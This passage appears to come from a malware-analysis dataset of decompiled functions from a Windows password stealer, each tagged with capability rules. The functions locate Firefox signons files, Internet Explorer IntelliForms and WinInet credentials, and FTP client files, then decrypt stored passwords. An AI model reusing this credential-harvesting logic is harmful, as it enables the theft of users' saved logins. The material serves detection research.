sub.kernel32.dll_lstrlenA(0x4138ab);\n                                    pcVar6 = lpString_00;\n                                    iVar4 = sub.shlwapi.dll_StrCmpNIA();\n                                    if (iVar4 != 0) {\n                                        sub.kernel32.dll_lstrlenA(0x4138b2);\n                                        pcVar6 = lpString_00;\n                                        iVar4 = sub.shlwapi.dll_StrCmpNIA();\n                                    }\n                                    if (iVar4 != 0) {\n                                        uVar9 = 0x4138ba;\n                                        uVar5 = sub.kernel32.dll_lstrlenA(0x4138ba, pcVar6);\n                                        pcVar6 = lpString_00;\n                                        iVar4 = sub.shlwapi.dll_StrCmpNIA(iVar8, 0x4138ba, uVar5, uVar9, lpString_00);\n                                    }\n                                }\n                                else if (*0x4137fb == 1) {\n                                    sub.kernel32.dll_lstrlenA(\"ftp.\");\n                                    pcVar6 = lpString_00;\n                                    iVar4 = sub.shlwapi.dll_StrCmpNIA();\n                                }\n                                else {\n                                    iVar4 = 0;\n                                }\n                                if (iVar4 == 0) {\n                                    uVar5 = sub.kernel32.dll_lstrlenA(arg_8h_01, pcVar6);\n                                    var_44h = fcn.00408ec1(arg_8h_01, uVar5);\n                                    uVar5 = sub.kernel32.dll_lstrlenA(arg_8h_02);\n                                    var_48h = fcn.00408ec1(arg_8h_02, uVar5);\n                                    if ((lpString_00 != NULL) && (var_48h != 0)) {\n                                        fcn.00401522(arg_8h, 0xbeef0000);\n                                        fcn.00401584(arg_8h, lpString_00);\n                                        fcn.00401584(arg_8h, var_44h);\n                                        fcn.00401584(arg_8h, var_48h);\n                                    }\n                                }\n                                fcn.0040178e(lpString_00);\n                                fcn.0040178e(arg_8h_01);\n                                fcn.0040178e(arg_8h_02);\n                                fcn.0040178e(var_44h);\n                                fcn.0040178e(var_48h);\n                                iVar8 = var_44h;\n                            }\n                            else if (var_18h == 6) {\n                                var_18h = 2;\n                            }\n                            if (var_18h != 0) {\n                                iVar4 = sub.kernel32.dll_lstrcmpA(uVar3, 0x4127dd);\n                                if (iVar4 == 0) {\n                                    var_18h = 1;\n                                }\n                                iVar4 = sub.kernel32.dll_lstrcmpA();\n                                if (iVar4 == 0) {\n                                    var_18h = 2;\n                                }\n                            }\n                        }\n                        fcn.0040178e(uVar3);\n                        iVar4 = -1;\n                        pcVar6 = arg_8h_03;\n                        do {\n                            arg_8h_03 = pcVar6;\n                            if (iVar4 == 0) break;\n                            iVar4 = iVar4 + -1;\n                            arg_8h_03 = pcVar6 + 1;\n                            cVar1 = *pcVar6;\n                            pcVar6 = arg_8h_03;\n                        } while (cVar1 != '\\0');\n                    } while (*arg_8h_03 != '\\0');\n                }\n                fcn.0040178e(hMem);\n            }\n            fcn.0040178e(arg_8h_00);\n        }\n        fcn.00401ea4(&var_10h);\n    }\n    fcn.00408e98();\n    return;\n}\n",
        "token_count": 1877
    },
    "0040939f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpFindFileData\n\nvoid __cdecl fcn.0040939f(uchar *arg_8h, uint arg_ch, uint arg_10h, char *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    uchar *hMem;\n    uint pszFirst;\n    char *lpFileName;\n    uint hFindFile;\n    uchar *lpFindFileData;\n    int16_t iStack282;\n    uchar auStack280 [276];\n    \n    lpFileName = NULL;\n    if ((arg_14h != NULL) && (*arg_14h != '\\0')) {\n        iVar1 = fcn.004023cb(arg_14h);\n        if (iVar1 == 0) {\n            lpFileName = fcn.00401c09(arg_14h, \"\\\\*.*\");\n        }\n        else {\n            lpFileName = fcn.00401c09(arg_14h, 0x4127e7);\n        }\n        fcn.004017bc(&fcn.0040939f::lpFindFileData, 0x13e);\n        iVar1 = sub.kernel32.dll_FindFirstFileA(lpFileName, &fcn.0040939f::lpFindFileData);\n        if (iVar1 != -1) {\n            do {\n                if ((lpFindFileData & 0x10) == 0) {\n                    if (*0x4137fb == 3) {\n                        hMem = &stack0xfffffee8;\n                        iVar2 = sub.shlwapi.dll_StrStrIA();\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00401c09(arg_14h, 0x4120b1);\n                            uVar3 = fcn.00401c5d(uVar3, &stack0xfffffee8);\n                            hMem = arg_8h;\n                            fcn.00403d67(arg_8h, uVar3, 0xbeef0001);\n                            fcn.0040178e(hMem);\n                        }\n                    }\n                    else {\n                        lpFindFileData = &stack0xfffffee8;\n                        iVar2 = sub.shlwapi.dll_StrStrIA();\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00401c09(arg_14h, 0x4120b1);\n                            uVar3 = fcn.00401c5d(uVar3, &stack0xfffffee8);\n                            lpFindFileData = arg_8h;\n                            fcn.00408fbe(arg_8h, uVar3, arg_ch, arg_10h);\n                            fcn.0040178e(lpFindFileData);\n                        }\n                        lpFileName = 0x40955b;\n                        uVar4 = sub.kernel32.dll_lstrlenA();\n                        if ((uVar4 < 2) || (*(&stack0xfffffee6 + uVar4) != 0x732e)) {\n                            lpFileName = \"signons.txt\";\n                            uVar3 = sub.shlwapi.dll_StrStrIA();\n                            hMem = sub.shlwapi.dll_StrStrIA(&stack0xfffffee8, \"signons2.txt\", uVar3);\n                            pcVar6 = \"signons3.txt\";\n                            puVar5 = &stack0xfffffee8;\n                            iVar2 = sub.shlwapi.dll_StrStrIA(&stack0xfffffee8, \"signons3.txt\", hMem);\n                            if ((iVar2 == 0) && ((puVar5 == NULL && (pcVar6 == NULL)))) goto code_r0x004095e2;\n                        }\n                        uVar3 = fcn.00401c09(arg_14h, 0x4120b1);\n                        uVar3 = fcn.00401c5d(uVar3, &stack0xfffffee8);\n                        hMem = arg_8h;\n                        fcn.00409049(arg_8h, uVar3, arg_ch, arg_10h);\n                        fcn.0040178e(hMem);\n                    }\n                }\n                else {\n                    hMem = 0x4127dd;\n                    iVar2 = sub.kernel32.dll_lstrcmpiA();\n                    if (iVar2 != 0) {\n                        hMem = 0x4127df;\n                        iVar2 = sub.kernel32.dll_lstrcmpiA();\n                        if (iVar2 != 0) {\n                            iVar2 = fcn.004023cb(arg_14h);\n                            if (iVar2 == 0) {\n                                uVar3 = fcn.00401c09(arg_14h, 0x4120b1);\n                            }\n                            else {\n                                uVar3 = fcn.00401c09(arg_14h, 0);\n                            }\n                            uVar3 = fcn.00401c5d(uVar3, &stack0xfffffee8);\n                            hMem = arg_8h;\n                            fcn.0040939f(arg_8h, arg_ch, arg_10h, uVar3);\n                            fcn.0040178e(hMem);\n                        }\n                    }\n                }\ncode_r0x004095e2:\n                iVar2 = sub.kernel32.dll_FindNextFileA(iVar1, &fcn.0040939f::lpFindFileData, hMem);\n            } while (iVar2 != 0);\n            sub.kernel32.dll_FindClose(iVar1);\n        }\n    }\n    fcn.0040178e(lpFileName);\n    return;\n}\n",
        "token_count": 1208
    },
    "0040962e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040962e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint lpString2;\n    uint lpFileName_00;\n    char *hMem;\n    uint arg_ch_00;\n    uint32_t uVar3;\n    char *arg_ch_01;\n    char *pcVar4;\n    char *pcVar5;\n    uint hMem_00;\n    uint lpReturnedString;\n    uint var_ch;\n    uint lpFileName;\n    uint lpszReturnBuffer;\n    \n    iVar2 = fcn.00401d90(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar2 = fcn.00401d90(arg_10h);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar2 = fcn.004023cb(arg_ch);\n    if (iVar2 == 0) {\n        lpString2 = fcn.00401c09(arg_ch, 0x4120b1);\n    }\n    else {\n        lpString2 = fcn.00401c09(arg_ch, 0);\n    }\n    lpFileName_00 = fcn.00401c09(lpString2, \"profiles.ini\");\n    hMem = fcn.004017a5(0xfdea);\n    arg_ch_00 = fcn.004017a5(0x1000);\n    iVar2 = fcn.00401d47(lpFileName_00);\n    if ((iVar2 != 0) &&\n       (uVar3 = sub.kernel32.dll_GetPrivateProfileSectionNamesA(hMem, 65000, lpFileName_00),  2 < uVar3)) {\n        cVar1 = *hMem;\n        pcVar5 = hMem;\n        while (cVar1 != '\\0') {\n            iVar2 = sub.shlwapi.dll_StrStrIA();\n            if ((iVar2 != 0) && (iVar2 = sub.kernel32.dll_GetPrivateProfileStringA(),  iVar2 != 0)) {\n                iVar2 = sub.kernel32.dll_GetPrivateProfileIntA(pcVar5, \"IsRelative\", 1, lpFileName_00);\n                if (iVar2 == 1) {\n                    arg_ch_01 = fcn.00401c09(lpString2, arg_ch_00);\n                    for (pcVar4 = arg_ch_01; (pcVar4 != NULL && (*pcVar4 != '\\0')); pcVar4 = pcVar4 + 1) {\n                        if (*pcVar4 == '/') {\n                            *pcVar4 = '\\\\';\n                        }\n                    }\n                    hMem_00 = arg_8h;\n                    fcn.00409616(arg_8h, arg_ch_01, arg_10h);\n                    fcn.0040178e(hMem_00);\n                }\n                else {\n                    fcn.00409616(arg_8h, arg_ch_00, arg_10h);\n                }\n            }\n            iVar2 = -1;\n            pcVar4 = pcVar5;\n            do {\n                pcVar5 = pcVar4;\n                if (iVar2 == 0) break;\n                iVar2 = iVar2 + -1;\n                pcVar5 = pcVar4 + 1;\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar5;\n            } while (cVar1 != '\\0');\n            cVar1 = *pcVar5;\n        }\n    }\n    fcn.0040178e(lpString2);\n    fcn.0040178e(arg_ch_00);\n    fcn.0040178e(lpFileName_00);\n    fcn.0040178e(hMem);\n    fcn.00409616(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 827
    },
    "00409c0f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409c0f(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *lpString;\n    char *pcVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x2a, 0);\n    iVar2 = fcn.00401cc2(0);\n    if (iVar2 != 0) {\n        uVar5 = arg_8h;\n        fcn.0040404c(arg_8h, iVar2, \"SiteInfo.QFP\", 0xbeef0000);\n        fcn.0040178e(uVar5);\n    }\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar4 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040223e(lpString);\n            uVar5 = arg_8h;\n            fcn.0040404c(arg_8h, arg_ch_00, \"SiteInfo.QFP\", 0xbeef0000);\n            fcn.0040178e(uVar5);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 482
    },
    "00409cb1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409cb1(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *lpString;\n    char *pcVar3;\n    char *pcVar4;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x2b, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar4 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040223e(lpString);\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, arg_ch_00, \"Favorites.dat\", 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 399
    },
    "00409eaf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409eaf(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, code *arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    \n    if (arg_18h != NULL) {\n        iVar1 = (**(*arg_14h + 0x54))(arg_14h, 0, arg_8h, arg_ch, 0, &var_48h);\n        if (iVar1 == 0) {\n            while( true ) {\n                var_44h = 0;\n                (**(*var_48h + 0xc))(var_48h, 0x10, &var_40h, &var_44h);\n                if (var_44h == 0) break;\n                puVar2 = &var_40h;\n                do {\n                    (*arg_18h)(arg_8h, arg_ch, *puVar2, arg_10h, arg_14h);\n                    sub.ole32.dll_CoTaskMemFree(*puVar2);\n                    puVar2 = puVar2 + 1;\n                    var_44h = var_44h + -1;\n                } while (var_44h != 0);\n            }\n            (**(*var_48h + 8))(var_48h);\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "00409f35": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409f35(uint arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *arg_ch_00;\n    int32_t *var_108h;\n    int32_t var_104h;\n    uint var_100h;\n    \n    iVar1 = (**(*arg_10h + 0x3c))(arg_10h, 0, arg_8h, 0, &var_108h);\n    if (iVar1 == 0) {\n        while( true ) {\n            var_104h = 0;\n            (**(*var_108h + 0xc))(var_108h, 0x10, &var_100h, &var_104h);\n            if (var_104h == 0) break;\n            arg_ch_00 = &var_100h;\n            do {\n                fcn.00409eaf(arg_8h, arg_ch_00, arg_ch, arg_10h, arg_14h);\n                arg_ch_00 = arg_ch_00 + 4;\n                var_104h = var_104h + -1;\n            } while (var_104h != 0);\n        }\n        (**(*var_108h + 8))(var_108h);\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "00409fcb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409fcb(uint arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *arg_8h_00;\n    int32_t *var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    iVar1 = (**(*arg_ch + 0x38))(arg_ch, 0, 0, &var_108h);\n    if (iVar1 == 0) {\n        while( true ) {\n            var_4h = 0;\n            (**(*var_108h + 0xc))(var_108h, 0x10, &var_104h, &var_4h);\n            if (var_4h == 0) break;\n            arg_8h_00 = &var_104h;\n            do {\n                fcn.00409f35(arg_8h_00, arg_8h, arg_ch, arg_10h);\n                arg_8h_00 = arg_8h_00 + 4;\n                var_4h = var_4h + -1;\n            } while (var_4h != 0);\n        }\n        (**(*var_108h + 8))(var_108h);\n    }\n    return;\n}\n",
        "token_count": 289
    },
    "0040a0c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a0c4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *var_82ch;\n    uint var_828h;\n    uint *var_824h;\n    int32_t var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_808h;\n    uint var_804h;\n    uint var_800h;\n    uint var_400h;\n    \n    fcn.00409e16(arg_8h, &var_400h, arg_18h);\n    sub.kernel32.dll_WideCharToMultiByte(0, 0, arg_10h, 0xffffffff, &var_800h, 0x3ff, 0, 0);\n    var_810h = 0x10;\n    var_80ch = 2;\n    var_808h = 0;\n    var_804h = 0;\n    (**(*arg_18h + 0x44))(arg_18h, 0, arg_8h, arg_ch, arg_10h, &var_818h, &var_814h, &var_810h, 0);\n    if (var_818h == 0) {\n        return;\n    }\n    if (var_814h == 0) {\n        return;\n    }\n    var_82ch = 0xbeef0000;\n    iVar1 = sub.kernel32.dll_lstrcmpiA(&var_400h, \"Internet Explorer\");\n    if (iVar1 != 0) {\n        var_82ch = 0xbeef0001;\n        iVar1 = sub.kernel32.dll_lstrcmpiA(&var_400h, \"WininetCacheCredentials\");\n        if (iVar1 != 0) {\n            var_82ch = 0xbeef0002;\n            puVar2 = &var_400h;\n            iVar1 = sub.kernel32.dll_lstrcmpiA(puVar2, \"MS IE FTP Passwords\");\n            if (iVar1 != 0) goto code_r0x0040a270;\n        }\n    }\n    puVar2 = &var_800h;\n    iVar1 = sub.shlwapi.dll_StrStrIA();\n    if (iVar1 == 0) {\n        fcn.0040a056(var_82ch, arg_10h, var_814h, var_818h, arg_14h);\n        puVar2 = var_82ch;\n    }\n    else if (*0x412404 != NULL) {\n        var_820h = var_818h;\n        var_81ch = var_814h;\n        iVar1 = (**0x412404)(&var_820h, 0, 0, 0, 0, 1, &var_828h);\n        if (iVar1 != 0) {\n            fcn.0040a056(var_82ch, arg_10h, var_824h, var_828h, arg_14h);\n            sub.kernel32.dll_LocalFree();\n            puVar2 = var_824h;\n        }\n    }\ncode_r0x0040a270:\n    sub.ole32.dll_CoTaskMemFree(var_814h, puVar2);\n    return;\n}\n",
        "token_count": 767
    },
    "0040a27f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a27f(uint arg_8h, uint lpString, ushort *arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t hMem;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint ARG_0;\n    uint var_14h;\n    \n    iVar1 = sub.kernel32.dll_lstrlenW(lpString);\n    if (iVar1 == 0) {\n        return;\n    }\n    fcn.00403374(lpString, iVar1 * 2 + 2, &var_14h);\n    var_2ch = 0;\n    for (uVar2 = 0; uVar2 < 0x14; uVar2 = uVar2 + 1) {\n        var_2ch = var_2ch + *(&var_14h + uVar2);\n    }\n    var_30h = 0;\n    for (uVar2 = 0; uVar2 < 0x14; uVar2 = uVar2 + 1) {\n        sub.user32.dll_wsprintfA(&ARG_0, \"%02X\", *(&var_14h + uVar2));\n        var_30h = fcn.00401c5d(var_30h, &ARG_0);\n    }\n    var_2ch = var_2ch & 0xff;\n    sub.user32.dll_wsprintfA(&ARG_0, \"%02X\", var_2ch);\n    var_30h = fcn.00401c5d(var_30h, &ARG_0);\n    iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\Microsoft\\\\Internet Explorer\\\\IntelliForms\\\\Storage2\", var_30h, &var_34h)\n    ;\n    if (iVar1 != 0) {\n        var_38h = iVar1;\n        if (var_34h != 0) {\n            iVar1 = sub.kernel32.dll_lstrlenW(lpString);\n            var_50h = iVar1 * 2 + 2;\n            var_4ch = lpString;\n            var_40h = var_34h;\n            var_3ch = var_38h;\n            hMem = 0;\n            if (*0x412404 != NULL) {\n                iVar1 = (**0x412404)(&var_40h, 0, &var_50h, 0, 0, 1, &var_48h);\n                if ((iVar1 != 0) && (hMem != 0)) {\n                    if (arg_10h != NULL) {\n                        *arg_10h = 0x3f;\n                    }\n                    fcn.0040a056(0xbeef0003, lpString, hMem, var_48h, arg_8h);\n                    sub.kernel32.dll_LocalFree();\n                }\n            }\n        }\n        fcn.0040178e(var_38h);\n    }\n    fcn.0040178e(var_30h);\n    return;\n}\n",
        "token_count": 731
    },
    "0040a3e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a3e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    ushort *var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t pszFirst;\n    int32_t pv;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar1 = sub.ole32.dll_CoCreateInstance(str._J7_, 0, 5, str.AJ7_, &var_4h);\n    if (-1 < iVar1) {\n        iVar1 = (**(*var_4h + 0x1c))(var_4h, &var_8h);\n        if ((-1 < iVar1) && (var_8h != NULL)) {\n            pszFirst = 0;\n            pv = 0;\n            var_30h = 0x28;\n            while( true ) {\n                var_34h = 0;\n                iVar1 = (**(*var_8h + 0xc))(var_8h, 1, &var_30h, &var_34h);\n                if ((iVar1 != 0) || (var_34h != 1)) break;\n                if (pszFirst != 0) {\n                    var_38h = sub.shlwapi.dll_StrStrIW(pszFirst, 0x413a74);\n                    if (var_38h == NULL) {\n                        var_38h = NULL;\n                    }\n                    else {\n                        *var_38h = 0;\n                    }\n                    fcn.0040a27f(arg_8h, pszFirst, var_38h);\n                    sub.ole32.dll_CoTaskMemFree();\n                    if (pv != 0) {\n                        sub.ole32.dll_CoTaskMemFree();\n                    }\n                }\n            }\n            (**(*var_8h + 8))(var_8h);\n        }\n        (**(*var_4h + 8))(var_4h);\n    }\n    fcn.0040a27f(arg_8h, L\"http://www.facebook.com/\", 0);\n    return;\n}\n",
        "token_count": 467
    },
    "0040a4d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a4d8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char16_t *pcVar3;\n    int32_t *piVar4;\n    int32_t var_20h;\n    char16_t *var_1ch;\n    uint var_18h;\n    int32_t *hMem;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    if (*0x413aea == 0) {\n        *0x413aea = 1;\n        for (pcVar3 = L\"abe2869f-9b47-4cd9-a358-c22904dba7f7\"; *pcVar3 != L'\\0'; pcVar3 = pcVar3 + 1) {\n            *pcVar3 = *pcVar3 << 2;\n        }\n    }\n    if (((*0x4123cc != NULL) && (*0x4123c8 != NULL)) && (*0x412404 != NULL)) {\n        var_4h = NULL;\n        var_8h = 0;\n        iVar1 = (**0x4123c8)(\"Microsoft_WinInet_*\", 0, &var_8h, &var_4h);\n        if (((iVar1 != 0) && (var_8h != 0)) && (piVar4 = var_4h,  var_4h != NULL)) {\n            for (; (var_8h != 0 && (*piVar4 != 0)); piVar4 = piVar4 + 1) {\n                iVar1 = *piVar4;\n                var_10h = *(iVar1 + 0x18);\n                var_ch = *(iVar1 + 0x1c);\n                iVar2 = sub.kernel32.dll_lstrlenW(L\"abe2869f-9b47-4cd9-a358-c22904dba7f7\");\n                var_20h = iVar2 * 2 + 2;\n                var_1ch = L\"abe2869f-9b47-4cd9-a358-c22904dba7f7\";\n                hMem = NULL;\n                iVar2 = (**0x412404)(&var_10h, 0, &var_20h, 0, 0, 1, &var_18h);\n                if ((iVar2 != 0) && (hMem != NULL)) {\n                    fcn.0040a08f(0xbeef0004, *(iVar1 + 8), hMem, var_18h, arg_8h);\n                    piVar4 = hMem;\n                    sub.kernel32.dll_LocalFree();\n                }\n                var_8h = var_8h + -1;\n            }\n            (**0x4123cc)(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 637
    },
    "0040a613": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a613(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0x2f, 0);\n    if (*0x41241c != NULL) {\n        var_8h = NULL;\n        iVar1 = (**0x41241c)(&var_8h, 0, 0, 0);\n        if ((-1 < iVar1) && (var_8h != NULL)) {\n            fcn.00409fcb(arg_8h, var_8h, fcn.0040a0c4);\n            (**(*var_8h + 8))(var_8h);\n        }\n    }\n    fcn.0040a3e0(arg_8h);\n    fcn.0040a4d8(arg_8h);\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 234
    },
    "0040a68f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a68f(uint16_t *lpString, uint32_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint16_t *puVar6;\n    uchar *puVar7;\n    uint16_t *puVar8;\n    uint32_t var_10h;\n    uchar *hMem;\n    uint32_t var_8h;\n    uint16_t *var_4h;\n    \n    *arg_ch = 0;\n    uVar3 = sub.kernel32.dll_lstrlenA(lpString);\n    if (uVar3 < 2) {\n        return 0;\n    }\n    uVar4 = uVar3 >> 1;\n    *arg_ch = uVar4;\n    puVar6 = lpString;\n    puVar8 = lpString;\n    if ((uVar3 & 1) == 0) {\n        for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n            uVar2 = *puVar6;\n            uVar1 = uVar2 >> 8;\n            if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                if ((uVar1 < 0x41) || (0x46 < uVar1)) {\n                    return 0;\n                }\n                uVar2 = uVar2 & 0xff | uVar1 - 0x37 << 8;\n            }\n            else {\n                uVar2 = uVar2 & 0xff | uVar1 - 0x30 << 8;\n            }\n            uVar1 = uVar2;\n            if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                if ((uVar1 < 0x41) || (0x46 < uVar1)) {\n                    return 0;\n                }\n                uVar2 = uVar2 & 0xff00 | uVar1 - 0x37;\n            }\n            else {\n                uVar2 = uVar2 & 0xff00 | uVar1 - 0x30;\n            }\n            *puVar8 = uVar2 << 4 | uVar2 >> 8;\n            puVar6 = puVar6 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        var_8h = *arg_ch;\n        var_4h = lpString;\n        hMem = NULL;\n        if ((((*0x412404 != NULL) && (iVar5 = (**0x412404)(&var_8h, 0, 0, 0, 0, 1, &var_10h),  iVar5 != 0)) &&\n            (hMem != NULL)) && (var_10h < *arg_ch || var_10h == *arg_ch)) {\n            uVar3 = var_10h;\n            puVar7 = hMem;\n            if (var_10h != 0) {\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *lpString = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    lpString = lpString + 1;\n                }\n            }\n            *arg_ch = var_10h;\n            sub.kernel32.dll_LocalFree(hMem);\n            return 1;\n        }\n    }\n    return 